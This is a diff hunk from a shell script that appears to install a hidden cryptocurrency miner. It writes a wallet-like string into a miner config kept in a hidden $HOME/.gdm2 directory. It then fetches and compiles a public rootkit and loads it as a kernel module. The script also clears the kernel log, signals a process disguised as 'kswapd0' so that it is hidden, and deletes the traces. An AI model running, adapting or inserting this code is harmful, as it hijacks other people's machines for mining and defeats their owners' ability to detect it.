@@ -448,7 +448,7 @@ sed -i 's/"user": *"[^"]*",/"user": "4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFF
 cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json
 
-cd /tmp || return; cd .ICE-unix || return; cd .X11-unix || return; apt update -y && apt install linux-headers-$(uname -r)  git make gcc build-essential -y; rm -rf hiding-cryptominers-linux-rootkit/ ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg -C ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ; rm -rf /tmp/.ICE-Unix/hiding-cryptominers-linux-rootkit/ && rm -rf /tmp/.X11-unix/hiding-cryptominers-linux-rootkit/ 
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt update -y && apt install linux-headers-$(uname -r) git make gcc -y; rm -rf hiding-cryptominers-linux-rootkit/ ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg -C ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ; rm -rf /tmp/.ICE-Unix/hiding-cryptominers-linux-rootkit/ && rm -rf /tmp/.X11-unix/hiding-cryptominers-linux-rootkit/ 
 
 
 
